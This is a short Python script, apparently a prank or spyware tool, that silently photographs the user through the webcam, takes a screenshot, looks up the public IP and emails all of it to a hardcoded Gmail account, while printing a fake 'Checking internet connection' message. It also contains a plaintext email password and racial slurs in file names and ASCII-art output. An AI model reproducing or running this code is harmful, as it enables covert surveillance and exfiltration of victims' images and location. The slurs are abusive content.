import cv2
from PIL import Image
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import requests
import pyscreenshot as ImageGrab
from playsound import playsound
def SendMail(ImgFileName,ScreenS):
    img_data = open(ImgFileName, 'rb').read()
    img_data2 = open(ScreenS, 'rb').read()
    msg = MIMEMultipart()
    msg['Subject'] = 'GanzyHacking'
    msg['From'] = 'ganzyknowsone@gmail.com'
    msg['To'] = 'ganzyknowsone@gmail.com'

    text = MIMEText("Ganzy BINGO!!!! ------------------Victims IP------:" +my_ip + "Screenshots and Webcam ")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(ImgFileName))
    msg.attach(image)
    image2 = MIMEImage(img_data2, name=os.path.basename(ScreenS))
    msg.attach(image2)
    
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(msg['From'], "KennyS20177")
    s.sendmail("ganzyknowsoneone@gmail.com", "ganzyknowsoneone@gmail.com", msg.as_string())
    s.quit()

try:

    my_ip=requests.get('http://ip.42.pl/raw').text
    video = cv2.VideoCapture(0) 
    for i in range(15):
        video.read()
    ret,frame=video.read()
    showPic = cv2.imwrite("smilenigga.jpg",frame)
    print(showPic)
    print("Checking internet connection....")
    video.release()
    cv2.destroyAllWindows()
    uim = ImageGrab.grab()
    uim.save('shownigga.png')
    SendMail("smilenigga.jpg","shownigga.png")
    im = Image.open("smilenigga.jpg")
    print("██╗      ██████╗  ██████╗ ██╗  ██╗     █████╗ ████████╗    ███╗   ███╗███████╗")
    print("██║     ██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔══██╗╚══██╔══╝    ████╗ ████║██╔════╝")
    print("██║     ██║   ██║██║   ██║█████╔╝     ███████║   ██║       ██╔████╔██║█████╗  ")
    print("██║     ██║   ██║██║   ██║██╔═██╗     ██╔══██║   ██║       ██║╚██╔╝██║██╔══╝  ")
    print("███████╗╚██████╔╝╚██████╔╝██║  ██╗    ██║  ██║   ██║       ██║ ╚═╝ ██║███████╗")
    print("╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚═╝╚══════╝")
                                     
    print("                                           				")
    print("                                           				")
    print("                                           				")
    time.sleep(0.5)
    



    print("███╗   ██╗██╗ ██████╗  ██████╗  █████╗ 	██║") 
    print("████╗  ██║██║██╔════╝ ██╔════╝ ██╔══██╗  ██║")
    print("██╔██╗ ██║██║██║  ███╗██║  ███╗███████║ 	██║")
    print("██║╚██╗██║██║██║   ██║██║   ██║██╔══██║ 	╚═╝")
    print("██║ ╚████║██║╚██████╔╝╚██████╔╝██║  ██║ 	██╗")
    print("╚═╝  ╚═══╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ 	╚═╝")





   


    playsound('sound.mp3')
    os.system("fim -a smilenigga.jpg")
except:
	print("No internet connection!")

